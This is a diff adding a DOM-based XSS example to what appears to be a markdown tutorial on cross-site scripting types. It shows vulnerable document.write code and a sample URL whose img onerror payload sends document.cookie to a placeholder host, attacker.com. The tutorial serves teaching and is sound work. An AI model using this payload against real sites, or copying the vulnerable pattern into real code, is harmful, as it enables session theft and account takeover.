@@ -26,4 +26,10 @@ Stored xss a.k.a persistent xss is where the malicious code will constantly exec
   kudos to imperva :D
 </p><br>
 **DOM-BASED XSS**   
-According to OWASP website, DOM-Based XSS a.k.a 'type-0 XSS' is such where the malicious code affects the DOM model, thus modifying the DOM environment in the victim's browser. The DOM (Document Object Model) can be used to create a cross site scripting attack as it only affects the client side and not the server side. Some famous DOM objects that are used in order to exploit DOM XSS are document.url, document.referrer etc. 
+According to OWASP website, DOM-Based XSS a.k.a 'type-0 XSS' is such where the malicious code affects the DOM model, thus modifying the DOM environment in the victim's browser. The DOM (Document Object Model) objects can be manipulated and used to create a cross site scripting attack as it only affects the client side and not the server side. Some famous DOM objects that are used in order to exploit DOM XSS are document.url, document.referrer etc. Let's take a scenario where a website https://www.redacted.com/index.html has the following code<br>
+```<script>document.write("<p>The Current URL is : </p>" + document.baseURI);</script>```. Now Suppose if the attacker manipulates the url into<br>```http://www.redacted.com/index.html#<img src=x onerror=this.src='http://attacker.com/?'+document.cookie;>```. The malicious javascript code will be executed as it is affecting the document.write function in the DOM environment.<br>
+<p align="center">
+ <img src="https://gotowebsecurity.com/wp-content/uploads/2017/05/DOM-based-cross-site-scripting-678x381.jpg" />
+ Kudos to gotowebsecurity for this amazing diagram :)
+</p> 
+
